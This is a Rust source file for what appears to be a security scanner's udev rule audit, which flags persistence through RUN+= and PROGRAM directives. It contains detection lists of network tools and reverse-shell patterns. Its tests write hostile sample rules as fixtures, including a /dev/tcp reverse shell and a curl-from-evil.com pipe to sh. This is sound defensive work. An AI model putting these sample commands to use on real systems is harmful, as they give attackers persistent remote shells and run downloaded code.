//! Udev rule audit
//!
//! Scans udev rules directories for persistence mechanisms, suspicious
//! RUN+= and PROGRAM directives that could execute malicious code when
//! hardware events occur.

use crate::checks::IotCheck;
use protectinator_container::filesystem::ContainerFs;
use protectinator_core::{Finding, FindingSource, Severity};
use std::collections::HashSet;
use tracing::debug;

/// Udev rules directories to scan
const UDEV_DIRS: &[&str] = &["/etc/udev/rules.d", "/lib/udev/rules.d"];

/// Suspicious paths for shell execution
const SUSPICIOUS_EXEC_PATHS: &[&str] = &["/tmp/", "/dev/shm/", "/var/tmp/"];

/// Standard udev helper paths (commands from these paths are expected)
const STANDARD_HELPER_PATHS: &[&str] = &[
    "/lib/udev/",
    "/usr/lib/udev/",
    "/bin/",
    "/usr/bin/",
    "/sbin/",
    "/usr/sbin/",
];

/// Network download tools
const NETWORK_TOOLS: &[&str] = &["curl", "wget", "nc ", "ncat "];

/// Reverse shell patterns
const REVERSE_SHELL_PATTERNS: &[&str] = &[
    "bash -i",
    "/dev/tcp/",
    "nc -e",
    "ncat -e",
    "python -c",
    "python3 -c",
    "perl -e",
    "socat",
];

fn make_source(location: &str) -> FindingSource {
    FindingSource::Persistence {
        persistence_type: "udev_rule".to_string(),
        location: location.to_string(),
    }
}

/// Udev rule audit check
pub struct UdevAuditCheck;

impl IotCheck for UdevAuditCheck {
    fn id(&self) -> &str {
        "iot-udev-audit"
    }

    fn name(&self) -> &str {
        "Udev Rule Audit"
    }

    fn run(&self, fs: &ContainerFs) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Build dpkg file ownership set for /etc/udev/rules.d/ checks
        let dpkg_owned = collect_dpkg_owned_files(fs);

        for udev_dir in UDEV_DIRS {
            let entries = match fs.read_dir(udev_dir) {
                Ok(e) => e,
                Err(_) => continue,
            };

            let is_etc_dir = *udev_dir == "/etc/udev/rules.d";

            for entry in entries.flatten() {
                let name = entry.file_name();
                let name_str = name.to_string_lossy().to_string();

                if !name_str.ends_with(".rules") {
                    continue;
                }

                let file_path = format!("{}/{}", udev_dir, name_str);
                let content = match fs.read_to_string(&file_path) {
                    Ok(c) => c,
                    Err(_) => continue,
                };

                check_rules_file(
                    fs,
                    &file_path,
                    &content,
                    is_etc_dir,
                    &dpkg_owned,
                    &mut findings,
                );
            }
        }

        findings
    }
}

/// Check a single rules file for suspicious directives
fn check_rules_file(
    _fs: &ContainerFs,
    file_path: &str,
    content: &str,
    is_etc_dir: bool,
    dpkg_owned: &HashSet<String>,
    findings: &mut Vec<Finding>,
) {
    let mut has_run_directive = false;

    for (line_num, line) in content.lines().enumerate() {
        let line = line.trim();

        // Skip comments and empty lines
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        // Extract RUN+= directives
        for run_match in extract_directive_values(line, "RUN+=") {
            has_run_directive = true;
            check_command(
                file_path,
                line_num + 1,
                &run_match,
                "RUN+=",
                findings,
            );
        }

        // Extract PROGRAM directives
        for program_match in extract_directive_values(line, "PROGRAM") {
            check_command(
                file_path,
                line_num + 1,
                &program_match,
                "PROGRAM",
                findings,
            );
        }
    }

    // If the file is in /etc/udev/rules.d/, has RUN+=, and is not dpkg-owned, flag it
    if is_etc_dir && has_run_directive && !dpkg_owned.contains(file_path) {
        // Only add this medium-severity finding if we haven't already flagged
        // something critical or high for this file
        let already_flagged = findings
            .iter()
            .any(|f| {
                f.resource.as_deref() == Some(file_path)
                    && (f.severity == Severity::Critical || f.severity == Severity::High)
            });

        if !already_flagged {
            findings.push(
                Finding::new(
                    "iot-udev-audit",
                    format!("Custom udev rule with RUN directive: {}", file_path),
                    format!(
                        "Udev rules file '{}' in /etc/udev/rules.d/ contains RUN+= directives \
                         and is not owned by any dpkg package. Custom udev rules with RUN \
                         directives can provide device-event-triggered persistence.",
                        file_path
                    ),
                    Severity::Medium,
                    make_source(file_path),
                )
                .with_resource(file_path.to_string())
                .with_remediation(
                    "Verify this udev rule is expected and the executed commands are safe. \
                     Remove if not intentionally placed.",
                )
                .with_reference("https://attack.mitre.org/techniques/T1546/"),
            );
        }
    }
}

/// Extract the value from a udev directive like RUN+="command" or PROGRAM="command"
fn extract_directive_values(line: &str, directive: &str) -> Vec<String> {
    let mut values = Vec::new();
    let mut search_from = 0;

    while let Some(pos) = line[search_from..].find(directive) {
        let abs_pos = search_from + pos + directive.len();
        let rest = &line[abs_pos..];

        // Skip optional = sign (for PROGRAM which may or may not have it)
        let rest = rest.strip_prefix('=').unwrap_or(rest);

        // Extract quoted value
        if let Some(rest) = rest.strip_prefix('"') {
            if let Some(end) = rest.find('"') {
                values.push(rest[..end].to_string());
            }
        }

        search_from = abs_pos;
    }

    values
}

/// Check a command extracted from a udev directive for suspicious patterns
fn check_command(
    file_path: &str,
    line_num: usize,
    command: &str,
    directive_type: &str,
    findings: &mut Vec<Finding>,
) {
    // Check for execution from suspicious paths
    if SUSPICIOUS_EXEC_PATHS.iter().any(|p| command.contains(p)) {
        findings.push(
            Finding::new(
                "iot-udev-audit",
                format!(
                    "Udev {} from suspicious path in {} line {}",
                    directive_type, file_path, line_num
                ),
                format!(
                    "Udev rule in '{}' line {} has {} executing from a writable/temporary \
                     path: '{}'. This is a strong indicator of udev-based persistence.",
                    file_path, line_num, directive_type, command
                ),
                Severity::Critical,
                make_source(file_path),
            )
            .with_resource(file_path.to_string())
            .with_remediation(
                "Remove this udev rule immediately and investigate the referenced executable.",
            )
            .with_reference("https://attack.mitre.org/techniques/T1546/"),
        );
        return;
    }

    // Check for network download commands
    if NETWORK_TOOLS.iter().any(|t| command.contains(t)) {
        findings.push(
            Finding::new(
                "iot-udev-audit",
                format!(
                    "Udev {} with network download in {} line {}",
                    directive_type, file_path, line_num
                ),
                format!(
                    "Udev rule in '{}' line {} has {} using network tools: '{}'. \
                     Downloading content during udev events is highly suspicious.",
                    file_path, line_num, directive_type, command
                ),
                Severity::Critical,
                make_source(file_path),
            )
            .with_resource(file_path.to_string())
            .with_remediation(
                "Remove this udev rule immediately. Udev rules should not download content.",
            ),
        );
        return;
    }

    // Check for reverse shell patterns
    if REVERSE_SHELL_PATTERNS.iter().any(|p| command.contains(p)) {
        findings.push(
            Finding::new(
                "iot-udev-audit",
                format!(
                    "Udev {} with reverse shell pattern in {} line {}",
                    directive_type, file_path, line_num
                ),
                format!(
                    "Udev rule in '{}' line {} has {} containing a reverse shell pattern: '{}'. \
                     This is almost certainly malicious.",
                    file_path, line_num, directive_type, command
                ),
                Severity::Critical,
                make_source(file_path),
            )
            .with_resource(file_path.to_string())
            .with_remediation(
                "Remove this udev rule immediately and investigate for further compromise.",
            )
            .with_reference("https://attack.mitre.org/techniques/T1059/004/"),
        );
        return;
    }

    // Check if command is from a standard helper path (informational)
    let is_standard = STANDARD_HELPER_PATHS
        .iter()
        .any(|p| command.starts_with(p));

    if is_standard {
        debug!(
            "Standard udev command in {} line {}: {}",
            file_path, line_num, command
        );
    }
}

/// Collect all file paths owned by dpkg packages
fn collect_dpkg_owned_files(fs: &ContainerFs) -> HashSet<String> {
    let mut owned = HashSet::new();

    let dpkg_info_dir = "/var/lib/dpkg/info";
    let entries = match fs.read_dir(dpkg_info_dir) {
        Ok(e) => e,
        Err(_) => return owned,
    };

    for entry in entries.flatten() {
        let name = entry.file_name();
        let name_str = name.to_string_lossy();

        if !name_str.ends_with(".list") {
            continue;
        }

        let list_path = format!("{}/{}", dpkg_info_dir, name_str);
        if let Ok(content) = fs.read_to_string(&list_path) {
            for line in content.lines() {
                let line = line.trim();
                if !line.is_empty() {
                    owned.insert(line.to_string());
                }
            }
        }
    }

    owned
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn setup_container(tmp: &TempDir) -> ContainerFs {
        ContainerFs::new(tmp.path())
    }

    #[test]
    fn test_detects_run_from_tmp() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let rules_dir = root.join("etc/udev/rules.d");
        fs::create_dir_all(&rules_dir).unwrap();

        fs::write(
            rules_dir.join("99-backdoor.rules"),
            r#"ACTION=="add", SUBSYSTEM=="usb", RUN+="/tmp/malware.sh"
"#,
        )
        .unwrap();

        // Empty dpkg info
        let dpkg_dir = root.join("var/lib/dpkg/info");
        fs::create_dir_all(&dpkg_dir).unwrap();

        let cfs = setup_container(&tmp);
        let check = UdevAuditCheck;
        let findings = check.run(&cfs);

        let critical: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .collect();
        assert!(!critical.is_empty(), "Should detect RUN from /tmp as critical");
        assert!(critical[0].title.contains("suspicious path"));
    }

    #[test]
    fn test_detects_reverse_shell_in_udev() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let rules_dir = root.join("etc/udev/rules.d");
        fs::create_dir_all(&rules_dir).unwrap();

        fs::write(
            rules_dir.join("99-evil.rules"),
            r#"ACTION=="add", RUN+="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
"#,
        )
        .unwrap();

        let dpkg_dir = root.join("var/lib/dpkg/info");
        fs::create_dir_all(&dpkg_dir).unwrap();

        let cfs = setup_container(&tmp);
        let check = UdevAuditCheck;
        let findings = check.run(&cfs);

        let shell_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("reverse shell"))
            .collect();
        assert_eq!(shell_findings.len(), 1);
        assert_eq!(shell_findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_flags_unowned_custom_rule_with_run() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let rules_dir = root.join("etc/udev/rules.d");
        fs::create_dir_all(&rules_dir).unwrap();

        // Custom rule with RUN pointing to a standard path but not dpkg-owned
        fs::write(
            rules_dir.join("99-custom.rules"),
            r#"ACTION=="add", SUBSYSTEM=="net", RUN+="/usr/bin/my-script"
"#,
        )
        .unwrap();

        let dpkg_dir = root.join("var/lib/dpkg/info");
        fs::create_dir_all(&dpkg_dir).unwrap();

        let cfs = setup_container(&tmp);
        let check = UdevAuditCheck;
        let findings = check.run(&cfs);

        let custom: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("Custom udev rule"))
            .collect();
        assert_eq!(custom.len(), 1);
        assert_eq!(custom[0].severity, Severity::Medium);
    }

    #[test]
    fn test_standard_lib_udev_rule_no_findings() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        // Put a standard rule in /lib/udev/rules.d/
        let lib_rules = root.join("lib/udev/rules.d");
        fs::create_dir_all(&lib_rules).unwrap();

        fs::write(
            lib_rules.join("60-persistent-storage.rules"),
            r#"# Standard storage rules
ACTION=="add", SUBSYSTEM=="block", RUN+="/lib/udev/hdparm"
"#,
        )
        .unwrap();

        let dpkg_dir = root.join("var/lib/dpkg/info");
        fs::create_dir_all(&dpkg_dir).unwrap();

        let cfs = setup_container(&tmp);
        let check = UdevAuditCheck;
        let findings = check.run(&cfs);

        // /lib/udev/rules.d/ rules are not flagged for dpkg ownership (only /etc/ is)
        // and standard paths in RUN+= are only Info-level (logged but not findings)
        let non_info: Vec<_> = findings
            .iter()
            .filter(|f| f.severity != Severity::Info)
            .collect();
        assert!(
            non_info.is_empty(),
            "Standard lib rules should not produce non-info findings, got: {:?}",
            non_info.iter().map(|f| &f.title).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detects_network_download_in_udev() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let rules_dir = root.join("etc/udev/rules.d");
        fs::create_dir_all(&rules_dir).unwrap();

        fs::write(
            rules_dir.join("99-download.rules"),
            r#"ACTION=="add", SUBSYSTEM=="usb", RUN+="/usr/bin/curl http://evil.com/payload.sh | sh"
"#,
        )
        .unwrap();

        let dpkg_dir = root.join("var/lib/dpkg/info");
        fs::create_dir_all(&dpkg_dir).unwrap();

        let cfs = setup_container(&tmp);
        let check = UdevAuditCheck;
        let findings = check.run(&cfs);

        let download: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("network download"))
            .collect();
        assert_eq!(download.len(), 1);
        assert_eq!(download[0].severity, Severity::Critical);
    }
}
